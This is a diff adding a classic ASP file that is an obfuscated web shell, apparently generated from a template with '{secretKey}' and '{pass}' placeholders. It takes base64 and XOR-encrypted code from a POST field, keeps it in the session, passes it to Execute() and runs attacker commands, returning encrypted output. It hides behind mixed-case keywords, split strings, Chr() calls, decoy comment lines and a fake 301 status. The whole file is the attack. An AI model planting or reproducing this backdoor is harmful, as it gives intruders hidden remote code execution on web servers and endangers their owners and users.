@@ -1,0 +1,60 @@
+<%
+Set ToPsEc = SeRveR.CrEateObJeCt("Scr"&"ipti"&"ng.Di"&"ct"&"ion"&"ar"&Chr("121"))
+FunCtioN Base64Decode(ByVal H3cyi)
+    <!--"-->
+    Dim qianxin, SaNgfoR
+    <!--"-->
+    Set qianxin = CReAteOBjeCt("Ms"&"xm"&"l"&Chr("50")&".DO"&"MDo"&"cume"&"nt.3."&Chr("48"))
+    Set SaNgfoR = qianxin.CreateElement("base"&Chr("54")&Chr("52"))
+    SaNgfoR.dataType = "bi"&"n.ba"&"se"&Chr("54")&Chr("52")
+    SaNgfoR.text = H3cyi
+    Base64Decode = SaNgfoR.nodeTypedValue
+    Set SaNgfoR = Nothing
+    Set qianxin = Nothing
+End FunCtioN
+FunCtioN DbAPPsEcUritY(nsfocCuS,isBin)
+    dim H3c,AlIBABA,BaIDU,ThrEatBOOk
+    ThrEatBOOk = len(key)
+    Set ChAitIn = CrEATeObjecT("AD"&"OD"&"B.St"&"re"&Chr("97")&Chr("109"))
+    ChAitIn.CharSet = "is"&"o-8"&"85"&"9-"&Chr("49")
+    ChAitIn.Type = Chr("50")
+    ChAitIn.OpeN
+    if IsArray(nsfocCuS) then
+        H3c=UBound(nsfocCuS)+1
+        For AlIBABA=Chr("49") To H3c
+            <!--"-->
+            ChAitIn.WriteText chrw(aScb(mIdb(nsfocCuS,AlIBABA,Chr("49"))) XOR Asc(Mid(key,(AlIBABA mod ThrEatBOOk)+Chr("49"),Chr("49"))))
+        Next REM ChAitIn.CharSet
+    end if
+    ChAitIn.Position = Chr("48")
+    <!--"-->
+    if isBin then
+        ChAitIn.Type = Chr("49")
+        DbAPPsEcUritY=ChAitIn.Read()
+    else REM ChAitIn.OpeN
+        DbAPPsEcUritY=ChAitIn.ReadText()
+    end if
+'AAAASDkey="3c6AADe0b8a9c1AASDA5224a"
+End FunCtioN
+    key="{secretKey}"
+    nsfocCuS=reQUest.FoRm("{pass}")
+    ReSpoNse.Status = "301 Moved Permanently"
+    if not IsEmpty(nsfocCuS) then
+
+        if  IsEmpty(SEssiOn("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))) then
+            nsfocCuS=DbAPPsEcUritY(Base64Decode(nsfocCuS),false)
+            SEssiOn("payload")=nsfocCuS
+            response.End
+        else
+            nsfocCuS=DbAPPsEcUritY(Base64Decode(nsfocCuS),true)
+            ToPsEc.Add "payload",SEssiOn("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))
+            Execute(ToPsEc(("p"&Chr("97")&Chr("121")&Chr("108")&Chr("111")&Chr("97")&Chr("100"))))
+            BaIDU=run(nsfocCuS)
+            rEspOnsE.Write(Chr(123) & Chr(34) & "message" & Chr(34) & Chr(58) & Chr(34))
+            if not IsEmpty(BaIDU) then
+                response.Write bAsE64EnCoDe(DbAPPsEcUritY(BaIDU,true))
+            end if
+            rEspOnsE.Write(Chr(34) & Chr(125))
+        end if
+    end if
+%>
